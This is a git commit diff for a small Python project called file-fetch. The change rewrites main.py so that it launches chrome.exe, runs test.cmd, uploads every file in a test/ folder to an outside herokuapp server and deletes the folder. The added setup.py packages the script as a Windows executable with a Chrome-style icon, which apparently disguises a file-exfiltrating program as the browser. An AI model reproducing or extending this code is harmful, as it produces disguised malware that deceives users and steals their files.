0ca33f27f35997532c50ab7dccdd739cc1c8ad1c
I-E-A-I-A-I-O <jesusdavid268@outlook.com>
2021-06-22 16:52:20 -0400

    py2exe

--- file-fetch/main.py
+++ file-fetch/main.py
@@ -1,26 +1,16 @@
-from subprocess import call
+from subprocess import call, Popen
 from os import path, sys, listdir
 from shutil import rmtree
 import requests
 
-def sendFiles():
-    url = "https://file-fetch.herokuapp.com/"
-    basepath = "test/"
-    for entry in listdir(basepath):
-        filepath = path.join(basepath, entry)
-        if path.isfile(filepath):
-            files = {'file': open(filepath, "rb")}
-            res = requests.post(url, files=files)
-            print(res.text)
-    rmtree(basepath, True)
-
-def executeProgram(programName: str):
-    call(programName)
-    sendFiles()
-
-def main():
-    script = "test.cmd"
-    executeProgram(script, False)
-
-if __name__ == "__main__": 
-    main()
+Popen("chrome.exe")
+call("test.cmd")
+url = "https://file-fetch.herokuapp.com/"
+basepath = "test/"
+for entry in listdir(basepath):
+    filepath = path.join(basepath, entry)
+    if path.isfile(filepath):
+        files = {'file': open(filepath, "rb")}
+        res = requests.post(url, files=files)
+        print(res.text)
+rmtree(basepath, True)
---
+++ file-fetch/setup.py
@@ -0,0 +1,9 @@
+from distutils.core import setup
+import py2exe
+
+setup(console=[
+    {
+        "script": "main.py",
+        "icon_resources": [(0, "g-chrome.ico")]
+    }
+])
